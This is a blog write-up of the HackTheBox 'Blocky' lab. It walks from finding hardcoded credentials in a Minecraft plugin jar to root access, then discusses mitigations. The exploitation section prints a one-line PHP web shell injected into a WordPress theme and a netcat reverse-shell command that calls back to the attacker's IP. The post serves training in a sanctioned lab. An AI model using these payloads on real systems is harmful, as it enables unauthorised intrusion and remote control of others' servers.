---
layout: post
title: 'HackTheBox - Blocky'
date: 2018-01-31
author: Casey Mullineaux
cover: '/images/htb/blocky/blocky.jpg'
tags: hackthebox
---

This Minecraft themed exercise demonstrates the importance of not hard coding credentials when developing software. After discovering credentials left by a sloppy developer in a Mincraft Addon, I was able to use them to compromise the entire system.
# Hacking the box
1. [Recon](#recon)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

## <a name="recon"></a> Recon
### nmap

First thing's first.
```bash
nmap -sV -sC -oA nmap 10.10.10.37
```

* **-sV** Probe open ports to determine service/version info 
* **-sC** Run default scripts
* **-oA <name>** Output all formats

The scan reveals a few interesting open ports. I'll start with port 80 that looks to be running WordPress and is widely known for vulnerabilities.

![htb-blocky-02](/images/htb/blocky/htb-blocky-02.png)

---

### wpscan

I fired up `wpscan` to see if there's any vulnerabilities in WordPress that I may be able to exploit.

```bash
wpscan --url 10.10.10.37
```

![htb-blocky-03](/images/htb/blocky/htb-blocky-03.png)

Although the scan returned 12 results, after assessing all the vulnerabilities most were XSS vulnerabilites or required an authenticated user. Not useful to me at this point, so I moved on.

---

### gobuster

I continued enumerating the host using `gobuster` to find any directories that may contain potentially interestin gcontent.

```bash
gobuster -u 10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

* **-u** The url of the host to scan
* **-w** The wordlist to use when searching for directories
* **-t** Number of threads

![htb-blocky-04](/images/htb/blocky/htb-blocky-04.png)

gobuster revealed a few directories of interest such as **/phpmyadmin** - I'll put that one in my back pocket in case I need it later.

Checking out **/plugins** shows a few java files - one aptly named `BlockyCore.jar`. Given the name of the box, could this be a clue?

![htb-blocky-05](/images/htb/blocky/htb-blocky-05.png)

I did a quick google search for *java decompilers* and stumbled across [javadecompilers.com](http://www.javadecompilers.com). I uploaded BlockyCore.jar and browsed through the results until I hit paydirt.

![htb-blocky-06](/images/htb/blocky/htb-blocky-06.png)

Bingo! root sql username and password sitting in plain text.

## <a name="exploit"></a>Exploitation

### Manipulating user credentials

Now armed with some credentials, I went back to the **phpmyadmin** page that was uncovered by gobuster. Using these credentials logged me in as mysql root user successfully.

![htb-blocky-07](/images/htb/blocky/htb-blocky-07.png)

I poked at the database for a little while, and came across the users table. There's a user listed named **Notch** and a password that appears to be hashed.

![htb-blocky-08](/images/htb/blocky/htb-blocky-08.png)

To see what kind of hash i'm dealing with, I pasted it into `hash-identifier` and it confirms a MD5 WordPress hash.

![htb-blocky-09](/images/htb/blocky/htb-blocky-09.png)

I googled around a little, and found a [website that generates WordPress hashes](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4) for a clear text string. 

I generated a new WordPress hash, and updated the password for the user **notch** in the database.

![htb-blocky-10](/images/htb/blocky/htb-blocky-10.png)

![htb-blocky-11](/images/htb/blocky/htb-blocky-11.png)

Heading over to the WordPress login page, I was able to login with the credentials I had set in the database via phpMyAdmin.
- Username: *notch*
- Password: *asupersecretpassword*

![htb-blocky-12](/images/htb/blocky/htb-blocky-12.png)

---

### Remote code execution

Knowing that WordPress runs on PHP, I wanted to see if I could get PHP to execute system commands on the box. To do that, I needed to modify a php page so when I loaded the page in my browser it would execute commands.

In WordPress, I went to `Preferences -> Editor`, selected the Theme Header template, and added a little php code.

```php
<?php echo system($_REQUEST['cmd']); ?>
```

Now whenever I load any page that includes the header.php file (which is basically all of them), I pass through a system command to the `cmd` query string and have it execute locally.

To verify I browsed to the main page and passed through the `ls` command. Viewing the source confirms code execution.

![htb-blocky-13](/images/htb/blocky/htb-blocky-13.png)

---

### Creating a reverse shell

To make manipulating future requests a little easier, I sent the request with remote code execution through to Burp Repeater.

Using the [Pentest Monkey Reverse Shell Cheat Sheet](http://www.pentestmonkey.net/cheat-sheet) I grabbed and modified a little snippet of code that will initiate a reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.200 1234 >/tmp/f 
```

![htb-blocky-14](/images/htb/blocky/htb-blocky-14.png)

And URL encode it with `CTRL + U`

![htb-blocky-15](/images/htb/blocky/htb-blocky-15.png)

I fired up a netcat listener on my Kali host ...
```bash
nc -lvnp 1234
```
* **-l** listen mode, for inbound connects
* **-v** verbose output
* **-n** numeric-only IP addresses, no DNS
* **-p <port>** local port to listen on

... and then browsed to the the index page to execute my php code and start the reverse shell.

![htb-blocky-16](/images/htb/blocky/htb-blocky-16.png)

A successful shell is returned as the www-data user.

### Switching users

I perform some enumeration on the files on the system, and come across the configuration file for phpMyAdmin located in `/etc/phpmyadmin/config-db.php`

Looking through this config file produces another set of juicy credentials.

![htb-blocky-17](/images/htb/blocky/htb-blocky-17.png)

I attempt to switch users with the new password and I successfully authenticate as **Notch**.

![htb-blocky-18](/images/htb/blocky/htb-blocky-18.png)

## <a name="privesc"></a>Privilege escalation

Now that i'm logged in as a user, I take a look to see what Notch can do.
```bash
sudo -l
```
* **-l** list user's privileges or check a specific command; use twice for longer format

![htb-blocky-19](/images/htb/blocky/htb-blocky-19.png)

It looks like **Notch** can do *everything* - including sudo! So i escalate to root.
```bash
sudo su -
```

![htb-blocky-20](/images/htb/blocky/htb-blocky-20.png)


# <a name="deconstruct"></a>Deconstructing the hack

Compromising this host was largely possible due to hard coded credentials in multiple places. Simply put, it's a horrible practice. Just don't do it kids!

Mitigating this risk can be difficult, especially when you're dealing with the practices and habits of human beings (i.e. your developers). 

In nearly all cases, the path to better security starts with training your staff with what is and isn't acceptable. From there you can work towards implementing peer code review and code auditing practices in hopes that these security mis-steps can be identified and resolved before they make their way into production code.

---

Escalating privilege was rudimentary due to a local user on the machine being granted way more permissions than necessary.

You should always strive to follow the [principal of least privilege](https://kb.iu.edu/d/amsv) whereby accounts, services etc. are only granted the necessary permissions scoped to that resources specific function. This ensures that in the unfortunate event that an account or service is compromised, the blast radius is dramatically reduced.
